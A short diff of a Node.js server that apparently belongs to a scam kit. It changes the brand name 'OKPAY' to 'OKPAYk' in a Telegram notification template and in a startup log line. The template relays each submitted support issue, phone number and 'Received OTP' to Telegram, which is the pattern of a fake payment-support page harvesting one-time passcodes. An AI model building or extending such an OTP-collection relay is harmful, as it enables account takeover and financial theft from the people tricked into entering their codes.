@@ -31,7 +31,7 @@ console.log(req.body);
         }
 
         // Telegram par bheje jaane wale message ka format
-        const messageText = `OKPAY NOTIFICATION
+        const messageText = `OKPAYk NOTIFICATION
 
 Support Issue: ${issue}
 Mobile Number: ${phone}
@@ -59,5 +59,5 @@ Received OTP: ${otp}`;
 
 // Server initialization
 app.listen(PORT, () => {
-    console.log("okpay server running successfully on port " + PORT);
+    console.log("okpayk server running successfully on port " + PORT);
 });
